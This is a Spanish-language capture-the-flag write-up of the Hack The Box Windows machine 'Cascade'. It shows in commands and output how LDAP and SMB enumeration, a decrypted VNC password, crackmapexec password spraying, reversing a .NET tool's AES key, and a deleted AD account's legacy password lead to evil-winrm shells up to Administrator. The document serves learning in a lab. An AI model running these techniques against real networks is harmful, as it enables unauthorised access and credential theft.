---
layout: single
title: Cascade - Hack The Box
excerpt: "Cascade es una máquina Windows de dificultad media en la cuál debemos conseguir las credenciales de tres usuarios. En primer lugar, se deberá enumerar LDAP de manera manual y conseguir información que nos sea valiosa, luego ya con acceso al sistema mediante Samba, encontraremos un archivo el cual debemos descifrar una contraseña. En la fase de escalamiento de privilegios, se aplicará ingeniería reversa a un ejecutable y así obtener las credenciales de un usuario. Finalmente, debemos recuperar la cuenta de un usuario del AD para finalmente obtener acceso como administrador."
date: 2020-07-25
classes: wide
header:
  teaser: /assets/images/hack-the-box/cascade_logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - LDAP
  - SMB
  - Reversing
  - Active-Diectory
---

<p align="center">
<img src="/assets/images/hack-the-box/cascade_logo.png">
</p>

Cascade es una máquina Windows de dificultad media en la cuál debemos conseguir las credenciales de tres usuarios. En primer lugar, se deberá enumerar LDAP de manera manual y conseguir información que nos sea valiosa, luego ya con acceso al sistema mediante Samba, encontraremos un archivo el cual debemos descifrar una contraseña. En la fase de escalamiento de privilegios, se aplicará ingeniería reversa a un ejecutable y así obtener las credenciales de un usuario. Finalmente, debemos recuperar la cuenta de un usuario del AD para obtener acceso como administrador.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 cascade.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n cascade.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```console
root@kali:/home/kali/Documents/HTB/Machines/Cascade/nmap# nmap -p- --open -T5 -n -v cascade.htb -oG all-ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 13:46 EDT
Initiating Ping Scan at 13:46
Scanning cascade.htb (10.10.10.182) [4 ports]

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p53,88,135,139,389,445,636,3268,3269,5985 cascade.htb -oN targeted.tx`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```console
root@kali:/home/kali/Documents/HTB/Machines/Cascade/nmap# nmap -sC -sV -p52,88,135,139,389,445,636,3268,3269,5985 cascade.htb -oN targeted.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 13:58 EDT
Nmap scan report for cascade.htb (10.10.10.182)
Host is up (0.093s latency).

PORT     STATE    SERVICE       VERSION
53/tcp open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-30 17:59:57Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
636/tcp  open     tcpwrapped
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m39s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-30T18:00:07
|_  start_date: 2020-04-30T09:24:00
```

Los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 53 (DNS Domain Name Service):` sirve para la asignación de nombres de dominio a direcciones IP.
- `Puerto 88 (Kerberos):` sirve para centralizar la autenticación de usuarios y equipos en una red.
- `Puerto 139 (NetBios Network Basic Input Output System):` permite a los hosts en una red LAN comunicarse con el hardware de la red y transmitir datos a través de la red.
- `Puerto 389 (LDAP):` protocolo de acceso ligero a directorios.
- `Puerto 445 (SMB):` compartir archivos a a través de una red TCP/IP Windows.


### Enum4linux

Para empezar, enumeramos el servicio Samba usando la herramienta `enum4linux`  y extraer información de hosts que nos sean de utilidad. Mediante esta herramienta, extraemos los nombres de los usuarios  y dominios en el sistema. El comando que se utiliza es `enum4linux cascade.htb`

El output del comando es el siguiente:

```console
 ============================ 
|    Users on cascade.htb    |
 ============================ 
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

 ============================= 
|    Groups on cascade.htb    |
 ============================= 
[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[IT] rid:[0x459]
group:[Production] rid:[0x45a]
group:[HR] rid:[0x45b]
group:[AD Recycle Bin] rid:[0x45f]
group:[Backup] rid:[0x460]
group:[Temps] rid:[0x463]
group:[WinRMRemoteWMIUsers__] rid:[0x465]
group:[Remote Management Users] rid:[0x466]
group:[Factory] rid:[0x46c]
group:[Finance] rid:[0x46d]
group:[Audit Share] rid:[0x471]
group:[Data Share] rid:[0x472]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Users' (RID: 513) has member: CASCADE\administrator
Group 'Domain Users' (RID: 513) has member: CASCADE\krbtgt
Group 'Domain Users' (RID: 513) has member: CASCADE\arksvc
Group 'Domain Users' (RID: 513) has member: CASCADE\s.smith
Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson
Group 'Domain Users' (RID: 513) has member: CASCADE\util
Group 'Domain Users' (RID: 513) has member: CASCADE\j.wakefield
Group 'Domain Users' (RID: 513) has member: CASCADE\s.hickson
Group 'Domain Users' (RID: 513) has member: CASCADE\j.goodhand
Group 'Domain Users' (RID: 513) has member: CASCADE\a.turnbull
Group 'Domain Users' (RID: 513) has member: CASCADE\e.crowe
Group 'Domain Users' (RID: 513) has member: CASCADE\b.hanson
Group 'Domain Users' (RID: 513) has member: CASCADE\d.burman
Group 'Domain Users' (RID: 513) has member: CASCADE\BackupSvc
Group 'Domain Users' (RID: 513) has member: CASCADE\j.allen
Group 'Domain Users' (RID: 513) has member: CASCADE\i.croft
```

### Enumeración LDAP

Procedemos a realizar la enumeración de LDAP usando la herramienta `ldapsearch` la cual nos permite realizar consultas sobre los datos dentro de un directorios LDAP usando la línea de comandos. El comando a utilizar es el siguiente:
`ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182 -D "cn=users,dc=cascade"`

- `-x:`  autenticación simple.
- `-H:` indica que consulte al servidor LDAP.
- `-b:` especifica la base desde donde comienza la búsqueda.
- `-D:` especifica el usuario con el que se va a autenticar en el servidor LDAP.

Después de un tiempo, leyendo el output de la consulta, encontramos la siguiente información sobre el usuario `r.thompson`:

```console
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

La línea que nos causa curiosidad es `cascadeLegacyPwd: clk0bjVldmE=`, así que vamos a decodificar lo anterior en base64:

```
root@kali:/home/kali# echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```

### Enumeración SMB

Primero utilizaremos `smbmap` para enumerar los recursos compartido que tiene accesos el usuario `r.thomposon`

```console
root@kali:/home/kali# smbmap -u r.thompson -p rY4n5eva  -d workgroup -H 10.10.10.182
[+] IP: 10.10.10.182:445        Name: cascade.htb                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 

```

Ahora con `smbclient` accedemos a los recursos compartidos en el servidor SMB, empezamos a realizar la enumeración en los diferentes directorios de `DATA` y descargamos los siguientes archivos:

```console
root@kali:/home/kali# smbclient \\\\10.10.10.182\\DATA -U CASCADE.LOCAL/r.thompson -W workgroup 
Enter WORKGROUP\r.thompson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

smb: \IT\Email Archives\> get "Meeting_Notes_June_2018.html"
smb: \IT\Logs\Ark AD Recycle Bin\> get ArkAdRecycleBin.log
smb: \IT\Logs\DCs\> get dcdiag.log
smb: \IT\Temp\s.smith\> get "VNC Install.reg"
```



## Explotación

De los archivos anteriores, el que nos interesa en estos momentos es `VNC Install.reg` que  encontramos en el directorio `Temp` del usuario `s.smith`. Este archivo contiene una contraseña cifrada:

```console
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
`````

Para descifrar la contraseña podemos usar el siguiente script [VNC Password Decrypter](https://github.com/jeroennijhof/vncpwd) o [Metasploit](https://github.com/frizb/PasswordDecrypts), finalmente, la contraseña que se obtiene es `sT333ve2`.

Ahora, usaremos `crackmapexec` para probar esa contraseña a qué usuario le pertenece y acceder a Samba. previamente se ha creado un archivo de texto con los usuarios encontrados en la enumeración inicial.

```
root@kali:/home/kali/Documents/HTB/Machines/Cascade/content/# crackmapexec smb 10.10.10.182 -u users.txt -p sT333ve2
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] CASCADE\administrator:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] CASCADE\rbtgt:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] CASCADE\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [+] CASCADE\s.smith:sT333ve2 
```

Con estas credenciales ya podemos acceder con `evil-winrm` para obtener la flag del  usuario.

```
┌─[nicolasmira101@parrot]─[~]
└──╼ $sudo evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2

Evil-WinRM shell v2.3

*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
*Evil-WinRM* PS C:\Users\s.smith\Documents> type ../Desktop/user.txt
ca4d32...........................

```



## Escalamiento de privilegios

Volvemos a revisar el protocolo SMB y miramos a qué directorios, el usuario `s.smith` tiene acceso

```
┌──[root@parrot]─[/home/nicolasmira101]
└──╼ #smbclient -U s.smith -L \\\\10.10.10.182\\

Enter WORKGROUP\s.smith's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Con `smbclient` accedemos a los recursos compartidos en el servidor SMB en el directorio `Audit` y descargamos los archivos que encontramos en este directorio, a nuestra máquina

```console
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Cascade]
└──╼ $sudo smbclient -U s.smith \\\\10.10.10.182\\Audit$                                                                               
[sudo] password for nicolasmira101: 
Enter WORKGROUP\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                       A    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                      A    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 01:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 01:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

smb: \> mget CascAudit.exe                                    
Get file CascAudit.exe? y                     
getting file \CascAudit.exe of size 13312 as CascAudit.exe (24.4 KiloBytes/sec) (average 24.4 KiloBytes/sec)  

smb: \> mget CascCrypto.dll 
Get file CascCrypto.dll? yes
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (21.7 KiloBytes/sec) (average 21.7 KiloBytes/sec)

smb: \> cd DB                        
smb: \DB\> ls                                         
  .                                   D        0  Tue Jan 28 16:40:59 2020
  ..                                  D        0  Tue Jan 28 16:40:59 2020
  Audit.db                            A    24576  Tue Jan 28 16:39:24 2020
  
smb: \DB\> mget Audit.db                 
Get file Audit.db? yes                  
getting file \DB\Audit.db of size 24576 as Audit.db (49.8 KiloBytes/sec) (average 36.5 KiloBytes/sec)                                  
```

Con `sqlite` revisamos el archivo `Audit.db` y revisamos todas las tablas. Al hacer una consulta a  la tabla `Ldap` encontramos la contraseña en base64 del usuario `ArkSvc`

```sql
sqlite > SELECT * FROM Ldap

1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

Procedemos a hacer ingeniería reversa a la aplicación `CascAudit.exe` y a `CascCrypto.dll ` usando la herramienta `ILSpy`. La parte de código que nos importa de la aplicación `CascAudit.exe` es la siguiente

```c#
val3.Read();
str = Conversions.ToString(val3.get_Item("Uname"));
str2 = Conversions.ToString(val3.get_Item("Domain"));
string encryptedString = Conversions.ToString(val3.get_Item("Pwd"));
try
{
	password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
}
catch (Exception ex)
{
	ProjectData.SetProjectError(ex);
	Exception ex2 = ex;
	Console.WriteLine("Error decrypting password: " + ex2.Message);
	ProjectData.ClearProjectError();
	return;
}
```

Del anterior código lo que más nos importa es la contraseña `c4scadek3y654321` que nos servirá en los pasos siguientes a realizar. Ahora, revisamos el archivo `CascCryto.dll` entender el método `DecryptStriing`

```c#
public static string DecryptString(string EncryptedString, string Key)
{
	//Discarded unreachable code: IL_009e
	byte[] array = Convert.FromBase64String(EncryptedString);
	Aes aes = Aes.Create();
	aes.KeySize = 128;
	aes.BlockSize = 128;
	aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
	aes.Mode = CipherMode.CBC;
	aes.Key = Encoding.UTF8.GetBytes(Key);
	using (MemoryStream stream = new MemoryStream(array))
	{
		using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
		{
			byte[] array2 = new byte[checked(array.Length - 1 + 1)];
			cryptoStream.Read(array2, 0, array2.Length);
			return Encoding.UTF8.GetString(array2);
		}
	}
}

```

Del anterior fragmento de código, podemos deducir que el algoritmo de cifrado es `AES`, el tamaño de la llave es de `128`, el vector de inicialización (IV) es `1tdyjCbY1Ix49842` y el modo de cifrado es `CBC` (por bloques).

Con toda la información anterior procedemos a decodificar la contraseña que se encuentra en base64, usando la llave y el vector de inicialización. Para esto, utilizamos la herramienta web `CyberChef` y entramos al siguiente [link](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09) para ver el procedimiento realizado para decodificar la contraseña.

De esta forma, obtenemos la contraseña del usuario `ArkSvc` que es `w3lc0meFr31nd`y procedemos a conectarnos con`evil-winrm`

```
┌─[nicolasmira101@parrot]─[~]
└──╼ $sudo evil-winrm -i cascade.htb -u ArkSvc -p w3lc0meFr31nd

Evil-WinRM shell v2.3

*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
cascade\arksvc
```

En la fase de enumeración, en uno de los archivos de log,  `ArkAdRecycleBin.log` que se presenta a continuación, podemos observar que se estaba moviendo el usuario `TempAdmin` a la papelera reciclable.

```
8/12/2018 12:22	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22	[MAIN_THREAD]	Validating settings...
8/12/2018 12:22	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Exiting with error code 0
```

Revisando en internet cómo restaurar un usuario eliminado en Active Directory. Primero nos cercioramos que el usuario se encuentre efectivamente eliminado con el siguiente comando

```
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

Y ahora con el siguiente comando, revisamos las propiedades del usuario `TempAdmin`

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter {displayName -eq "TempAdmin"} -IncludeDeletedObjects -Properties * 

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0 
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin 
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz 
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059  
codePage                        : 0 

```

Al igual que el usuario `r.thompson` encontramos el campo `cascadeLegacyPwd` que nos indica la contraseña de este usuario y se encuentra en base64. Lo que hacemos es decodificarla usando el comando `base64`

```bash
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Cascade]
└──╼ $echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```

Finalmente, nos conectamos otra vez vía evil-winrm como usuario `Administrator`con las credenciales del usuario `TempAdmin` y de esta manera, obtendremos la flag de root.

```bash
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Cascade]
└──╼ $sudo evil-winrm -i cascade.htb -u Administrator -p baCT3r1aN00dles 

Evil-WinRM shell v2.3                              
Info: Establishing connection to remote endpoint                                                                  
*Evil-WinRM* PS C:\Users\Administrator> whoami                       
cascade\administrator       
*Evil-WinRM* PS C:\Users\Administrator> type /Desktop/root.txt                     
b947f3...........................      
```